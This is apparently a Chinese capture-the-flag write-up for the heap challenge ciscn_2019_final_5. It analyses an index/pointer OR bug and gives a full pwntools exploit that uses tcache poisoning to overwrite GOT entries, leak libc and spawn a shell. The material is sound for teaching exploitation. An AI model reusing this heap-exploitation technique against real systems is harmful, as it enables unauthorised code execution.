[toc]

## ciscn_2019_final_5

### 总结

根据本题，学习与收获有：

- `tcache bin`的利用都不需要伪造`chunk`，直接修改`tcache chunk`的`next`指针即可。但是`libc2.27`之后的版本加入了检查。
- `tcache bin dup`，也不存在检查，当有`UAF`漏洞的时候，可以直接对`tcache chunk`多次释放。
- `tcache chunk`不会和`top_chunk`合并。
- 题目要读仔细，对于一些奇怪的操作，可以复现一下，加快分析速度！



### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150104.png)

没有开启PIE防护。

#### 函数分析

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150232.png)

可以看出来，是个很经典的菜单题。

##### menu

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150310.png)

提供三个选择，接下来依次来看

##### new_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150435.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150507.png)

这个函数要注意以下几点：

- 输入索引的范围是0~0x10，也就是说最多可以存储17个`chunk`
- `malloc`的范围为0~0x1000
- 输出了每个`chunk`地址的低3个字节
- `0x6020e0`存储`chunk`的指针，但是存储的是**输入的`idx`和分配到的`chunk_ptr`的或值**
- **外部输入的`idx`和实际存放在`0x6020e0`数组的索引并不一致！！**



##### del_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150951.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307151033.png)

这里有两点要注意：

- 外部输入的`idx`并不是会对应去删除`0x6020e0[idx]`处的`chunk`，而是遍历`0x6020e0`处的数组，对每一个地址`ptr & 0xf`取出索引，再和外部输入的`idx`比较，如果一样，就去删除这个地方的`chunk`
- 找到索引后，取出的要删除的`chunk`的地址是通过`ptr & 0xfffffffffffffff0`计算得到的

##### edit_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307151441.png)

这里寻找索引和取出`chunk`的方式和`del_note`是一样的。

#### 漏洞点

漏洞点就在于很奇怪的计算索引和计算`chunk`地址的方式，分析这两种计算方式，可以发现：

- 由于`chunk`的地址一定是页对齐的，所以分配堆的地址的最后一位肯定是0x?0。这个地址和`[0, 0xf]`之间的索引取**或**值，对地址前面的值是不影响的，如`0x20 | 0xf = 0x2f`。因此，这个时候使用`ptr & 0xf`取索引没问题，使用`ptr & 0xf0`取原来的`chunk`指针，也没问题。
- 但是，如果给的索引是`0x10`，那么就有问题了。举例说明：假设分配到的`chunk_ptr`地址的最后一位为`0x60`，那么按照`new_note`的存储方式，数组中最后存的地址为`0x60 | 0x10 = 0x70`。要取出索引，得输入`0x70 & 0xf = 0x0`，取出的`chunk_ptr`为`0x70 & 0xf0 = 0x70`。那么如果调用`del_note`或`edit_note`，实际上处理的地址不是`0x60`，而是为`0x70`。
- 也就是说，如果首先创建`0x10`为`idx`的`chunk`，调用`edit_note`的时候，要输入的索引实际不能是`0x10`，而是`0`，并且编辑的地址会往高地址移动`0x10`个字节。这可以**修改下一个`chunk`的`pre_size`和`size`域大小**。

### 利用思路

步骤：

- 分配一个`chunk A`，输入索引为`0x10`，大小为`0x10`
- 分配一个`chunk B`，输入索引为`0x1`，大小为`0x10`
- 分配一个`chunk C`，输入索引为`0x2`，大小为`0x10`
- 分配一个`chunk D`，输入索引为`0x3`，大小为`0x20`
- 分配一个`chunk E`，输入索引为`0x4`，大小为`0x10`，输入内容为`/bin/sh\x00`
- 通过`edit_note`接口，输入索引`0`，来修改`chunk B`的`size`为`0x71`，这是为了把`chunk C`和`chunk D`都囊括进来，制造`overlapped chunk`。
- 依次释放`chunk B `和`chunk C`和`chunk D`
- 分配一个`chunk F`，输入索引为`0x1`，大小为`0x60`，把刚刚释放那个假的`chunk`申请回来，并修改已经释放了的`chunk C`和`chunk D`的`next`指针
- 利用`tcache bin attack`分别分配`chunk G`到`free@got`处和`chunk H`到`setbuf@got`处，将`free@got`覆盖为`put@plt`，将`setbuf@got`填为`‘a’ * 8`。然后调用`del_note(chunk H)`，泄露出`atoi`函数的地址。
- 最后利用`edit_not`接口来修改`chunk G`，将`free@got`修改为`system`地址，最后`del_note(chunk E)`获取到`shell`

### EXP

#### 调试过程

首先，写好函数，并且也可以定义一个数组，存储`chunk`地址，模拟`0x6020e0`数组，同时，保证变化与程序一致。

```python
# x[0]存储低3位和索引的或值，x[1]以及真实的chunk地址
qword_0x6020e0 = [[0, 0]] * 17

def show_qword_0x6020e0():
    '''如果RealPtr（真实的chunk地址）和GetPtr（计算取出来的chunk地址）不一样的话，用绿色打印！'''
    global qword_0x6020e0
    addr = 0x6020e0
    for x in qword_0x6020e0:
        if x[0] == 0:
            continue
        fstr = 'Addr:{}  StorePtr:{}  RealPtr:{}  GetPtr:{}  GetIdx:{}'.format(hex(addr), hex(x[0]), hex(x[1]), hex(x[0] & 0xfff0),hex(x[0] & 0xf))
        if (x[1]) != (x[0] & 0xfff0):
            print_green('[*] ' + fstr)
        else:
            log.info(fstr)
        addr += 8

def new_note(idx:int, size:int, content:bytes=b'\x00'):
    global io, qword_0x6020e0
    assert idx >= 0 and idx <= 0x10
    io.sendlineafter("your choice: ", '1')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(size))
    io.sendafter("content: ", content)
    low_bytes = io.recvline()
    log.info('get msg:{}'.format(low_bytes))
    low_bytes = low_bytes[12:-1]
    low_bytes = int16(low_bytes.decode())
    store_low = (low_bytes | idx)
    for i in range(0x11):
        if qword_0x6020e0[i][0] == 0:
            qword_0x6020e0[i] = [store_low, low_bytes]
            break
    return low_bytes, i


def del_note(idx:int):
    global io, qword_0x6020e0
    io.sendlineafter("your choice: ", '2')
    io.sendlineafter("index: ", str(idx))
    msg = io.recvline()
    count = -1
    for x in qword_0x6020e0:
        count += 1
        if (x[0] & 0xf) == idx:
            x[0] = 0
            x[1] = 0
            break
    return msg, count

def edit_note(idx:int, content:bytes):
    global io
    io.sendlineafter("your choice: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendafter("content: ", content)
    io.recvuntil("edit success.\n\n")
```

按照利用思路分配`chunk`，并打印数组看看：

```python
# get chunk
new_note(0x10, 0x10) # idx 0 chunk A
new_note(0x1, 0x10) # idx 1 chunk B
new_note(0x2, 0x10) # idx 2 chunk C
new_note(0x3, 0x20) # idx 3 chunk D
new_note(0x4, 0x10, b'/bin/sh\x00') # idx 4 chunk E

show_qword_0x6020e0() # show array
```

的确是这样的：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307155954.png)

看下堆：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160244.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160305.png)



然后修改`size`域：

```python
# edit and overlap size field
edit_note(0, p64(0) + p64(0x71))
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160436.png)

释放这个假`chunk`：

```python
# del_note 1 chunk B and re-malloc it
del_note(1)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160554.png)

重新`malloc`回来，然后释放`chunk C/D`，并修改它们的`next`指针：

```python
new_note(0x1, 0x60) # idx 1 chunk F

 # del_note 2 chunk C and 3 chunk D
del_note(2)
del_note(3)

# change the next pointer of freed chunk C and freed chunk D
payload = p64(0) * 3 + p64(0x21) + p64(0x602018) + p64(0) * 2 + p64(0x31) + p64(0x602070)
edit_note(1, payload)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160839.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160923.png)

分配到`free@got`和`setbuf@got`，并修改内容：

```python
# tcache attack
new_note(1, 0x10)
new_note(1, 0x20)

new_note(2, 0x10, p64(0x400790)) # idx 2, chunk G, change free@got to puts@plt
new_note(3, 0x20, b'a' * 8) # idx 3, chunk H, change setbuf@got to 'aaaaaaaa'
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161121.png)

看下数组：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161223.png)



然后泄露并计算system的地址，再看下数组：

```python
# call del_note to leak __libc_atoi address and calculate __libc_system address
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '3')
msg = io.recvline()
show_qword_0x6020e0() # show array
# edit_note, change free@got to __libc_system
atoi_addr = u64(msg[8:-1] + b'\x00\x00')
LOG_ADDR('atoi_addr', atoi_addr)
system_addr = atoi_addr + 0xedc0
edit_note(10, p64(system_addr) * 2)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161418.png)

注意：要访问`chunk G`的话，得输入`idx`为`0xa`

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161456.png)

注意，这个时候`0x6020110`处的会被置空：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161600.png)

修改成功：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161811.png)

最后只需要`free chunk E`：

```python
# get shell
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '4')
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161945.png)



#### 最终exp

```python
from pwn import *

io = process('./ciscn_2019_final_5')

# x[0]存储低3位和索引的或值，x[1]以及真实的chunk地址
qword_0x6020e0 = [[0, 0]] * 17

def show_qword_0x6020e0():
    '''如果RealPtr（真实的chunk地址）和GetPtr（计算取出来的chunk地址）不一样的话，用绿色打印！'''
    global qword_0x6020e0
    addr = 0x6020e0
    for x in qword_0x6020e0:
        if x[0] == 0:
            continue
        fstr = 'Addr:{}  StorePtr:{}  RealPtr:{}  GetPtr:{}  GetIdx:{}'.format(hex(addr), hex(x[0]), hex(x[1]), hex(x[0] & 0xfff0),hex(x[0] & 0xf))
        if (x[1]) != (x[0] & 0xfff0):
            print_green('[*] ' + fstr)
        else:
            log.info(fstr)
        addr += 8

def new_note(idx:int, size:int, content:bytes=b'\x00'):
    global io, qword_0x6020e0
    assert idx >= 0 and idx <= 0x10
    io.sendlineafter("your choice: ", '1')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(size))
    io.sendafter("content: ", content)
    low_bytes = io.recvline()
    log.info('get msg:{}'.format(low_bytes))
    low_bytes = low_bytes[12:-1]
    low_bytes = int16(low_bytes.decode())
    store_low = (low_bytes | idx)
    for i in range(0x11):
        if qword_0x6020e0[i][0] == 0:
            qword_0x6020e0[i] = [store_low, low_bytes]
            break
    return low_bytes, i


def del_note(idx:int):
    global io, qword_0x6020e0
    io.sendlineafter("your choice: ", '2')
    io.sendlineafter("index: ", str(idx))
    msg = io.recvline()
    count = -1
    for x in qword_0x6020e0:
        count += 1
        if (x[0] & 0xf) == idx:
            x[0] = 0
            x[1] = 0
            break
    return msg, count

def edit_note(idx:int, content:bytes):
    global io
    io.sendlineafter("your choice: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendafter("content: ", content)
    io.recvuntil("edit success.\n\n")

# get chunk
new_note(0x10, 0x10) # idx 0 chunk A
new_note(0x1, 0x10) # idx 1 chunk B
new_note(0x2, 0x10) # idx 2 chunk C
new_note(0x3, 0x20) # idx 3 chunk D
new_note(0x4, 0x10, b'/bin/sh\x00') # idx 4 chunk E

show_qword_0x6020e0() # show array

# edit and overlap size field
edit_note(0, p64(0) + p64(0x71))

# del_note 1 chunk B and re-malloc it
del_note(1)
new_note(0x1, 0x60) # idx 1 chunk F
 # del_note 2 chunk C and 3 chunk D
del_note(2)
del_note(3)

# change the next pointer of freed chunk C and freed chunk D
payload = p64(0) * 3 + p64(0x21) + p64(0x602018) + p64(0) * 2 + p64(0x31) + p64(0x602070)
edit_note(1, payload)

# tcache attack
new_note(1, 0x10)
new_note(1, 0x20)

new_note(2, 0x10, p64(0x400790)) # idx 2, chunk G, change free@got to puts@plt
new_note(3, 0x20, b'a' * 8) # idx 3, chunk H, change setbuf@got to 'aaaaaaaa'

# call del_note to leak __libc_atoi address and calculate __libc_system address
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '3')
msg = io.recvline()

show_qword_0x6020e0() # show array

# edit_note, change free@got to __libc_system
atoi_addr = u64(msg[8:-1] + b'\x00\x00')
LOG_ADDR('atoi_addr', atoi_addr)
system_addr = atoi_addr + 0xedc0
show_qword_0x6020e0()
edit_note(10, p64(system_addr) * 2)

# get shell
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '4')

io.interactive()
```





